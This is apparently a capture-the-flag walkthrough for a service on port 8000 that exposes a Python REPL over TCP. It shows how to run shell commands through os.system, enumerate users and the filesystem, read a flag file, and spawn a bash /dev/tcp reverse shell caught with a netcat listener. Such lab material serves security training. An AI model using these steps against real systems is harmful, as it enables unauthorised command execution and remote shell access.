# PYTHON/BASH CODE FOR SHELL EXECUTION in netcat

* That service on port `8000` isn’t a normal shell.
* It’s a **Python REPL (interpreter)** exposed over TCP.
* That’s why when you typed `ls`, it said *“name 'ls' is not defined”* — because `ls` isn’t a Python command, it’s a Linux one.

###✅ Next Steps (Enumeration in a Python REPL)

1. **Confirm Python Execution**

   * Try something simple:

     ```python
     2+2
     ```

     If it returns `4`, you know you’re inside Python.

2. **Import OS Commands**

   * You can use Python’s `os` or `subprocess` to run shell commands.
   * Example:

     ```python
     import os
     os.system("ls")
     ```

     or:

     ```python
     __import__('os').system('id')
     ```

3. **Check Current User / Privileges**

   ```python
   os.system("whoami")
   os.system("id")
   ```

4. **Explore Filesystem**

   ```python
   os.system("ls -la /")
   os.system("ls -la /home")
   ```

5. **Search for the Flag**

   * Usually in `/home/<user>` or `/root`.

   ```python
   os.system("cat /home/pyrat/user.txt")
   ```

6. **(If Needed) Upgrade Shell**

   * Sometimes you can spawn a reverse shell back to your machine:

     ```python
     os.system("bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1")
     ```

     Then catch it with:

     ```bash
     nc -lvnp <your-port>
     ```


